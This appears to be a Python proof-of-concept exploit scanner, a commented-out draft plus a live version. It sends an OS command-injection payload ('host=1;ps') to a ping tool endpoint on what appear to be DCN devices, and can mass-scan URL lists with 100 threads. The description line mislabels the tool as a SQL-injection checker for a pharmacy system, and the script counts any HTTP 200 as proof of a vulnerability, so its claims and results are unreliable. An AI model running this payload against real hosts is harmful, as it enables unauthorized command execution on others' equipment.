# import sys
# import argparse
# import requests
# import logging
# import re
# import json
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
# # 设置日志记录
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# logger = logging.getLogger(__name__)
#
# GREEN = '\033[92m'  # 输出颜色
# RESET = '\033[0m'
#
#
# def banner():
#     banner = r"""
#   _              _
#  (_)            (_)
#   ___      _____ _ _ __   __ _
#  | \ \ /\ / / _ \ | '_ \ / _` |
#  | |\ V  V /  __/ | | | | (_| |
#  |_| \_/\_/ \___|_|_| |_|\__,_|
#
#
#
#
#
#                             version:1.1.0
#                             author:fangwei
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/function/system/tool/ping.php"
#     headers = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,"
#                   "image/svg+xml,*/*;q=0.8",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Accept-Encoding": "gzip,deflate",
#         "Content-Type": "application/x-www-form-urlencoded",
#         "Content-Length": "107",
#         "Connection": "close",
#         "Cookie": "cookie",
#         "Upgrade-Insecure-Requests": "1",
#         "Priority": "u=4",
#     }
#     data = "dcn_test_a_967=21&dcn_test_b_967=122&dcn_test_c_967=111&dcn_test_d=_967&doing=ping&host=1;ps&proto=&count=1"
#     proxies = {
#         "http": "http://127.0.0.1:8080",
#         "https": "http://127.0.0.1:8080",
#     }
#     try:
#         res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=10,
#                              proxies=proxies)
#         if res1.status_code == 200:
#             logger.info(f"{GREEN}[+] {target} 存在命令执行漏洞{RESET}")
#             with open("DCNrer.txt", "a", encoding='utf-8') as f:
#                 f.write(target + "\n")
#             return True
#         else:
#             logger.info(f"[-] {target} 不存在命令执行漏洞")
#             return False
#     except Exception as e:
#         logger.error(f"[-] {target} 连接失败")
#
#
# if __name__ == '__main__':
#     main()
import requests
import sys
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|

                            version:1.1.0
                            author:fangwei     
    """
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        # 多线程处理
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


def poc(target):
    payload_url = "/function/system/tool/ping.php"
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Connection': 'close',
    }

    data = "dcn_test_a_967=21&dcn_test_b_967=122&dcn_test_c_967=111&dcn_test_d=_967&doing=ping&host=1;ps&proto=&count=1"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10,
                            allow_redirects=False)

        # 处理302重定向
        if res.status_code == 302:
            logging.warning(f"[*] 请求重定向: {target}。请查看响应头中的Location字段。")
            return

        # 检查响应状态码
        if res.status_code == 200:
            logging.info(f"{GREEN}[+] 该网站存在命令执行漏洞: {target}{RESET}")
            with open("DCNrer.txt", "a", encoding='utf-8') as f:
                f.write(target + "\n")
            return True
        else:
            logging.info(f"[-] 返回状态码: {res.status_code}, 该网站可能不存在漏洞，请检查: {target}")

    except requests.RequestException as e:
        logging.error(f"[*] 该网站无法访问，url为: {target}, 错误信息: {e}")


if __name__ == '__main__':
    main()

